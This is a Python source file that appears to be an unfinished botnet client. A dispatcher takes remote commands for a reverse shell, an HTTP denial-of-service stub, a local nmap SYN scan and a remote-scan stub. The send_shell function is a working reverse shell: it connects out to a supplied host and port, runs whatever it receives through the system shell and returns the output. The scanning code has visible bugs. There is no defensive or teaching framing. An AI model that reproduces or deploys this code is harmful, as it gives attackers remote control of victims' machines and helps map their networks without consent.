import netifaces as ni
import nmap
import os
import socket
import subprocess

def send_shell(target):
    ip = target[:target.index(':')]
    port = target[target.index(':')+1:]
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, int(port)))
    while True:
        data = s.recv(1024)
        proc = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        s.send(stdout_value)
    s.close()

def scan_local():
    nm = nmap.PortScanner()
    #TODO Make this more readable
    for iface,gateway in zip(ni.interfaces(),ni.gateways()):
        iface_attr = ni.ifadresses(iface)
        netmask = str(iface_attr['netmask'])
        cidr = sum([bin(int(x)).count('1') for x in netmask.split('.')])
        net_addr = "".join(gateway.split('.')[:len(gateway.split)-1]) + "0"
        #TODO Fix this to allow for larger subnets
        nm.scan(hosts="{ip}/{cidr}".format(net_addr,cidr), arguments='-sS')
        hosts_list = [x for x in nm.all_hosts() if nm[x]['status']['state'] == 'up']

def scan_remote(target):
    pass

def http_dos(target):
    print "HERE!"

def bot_action(parsed_command):
    if parsed_command['command'] == 'send-shell':
        send_shell(parsed_command['target'])
    elif parsed_command['command'] == 'http-dos':
        http_dos(parsed_command['target'])
    elif parsed_command['command'] == 'scan-local':
        scan_local()
    elif parsed_command['command'] == 'scan-remote':
        scan_remote(parsed_command['target'])
    else:
        pass

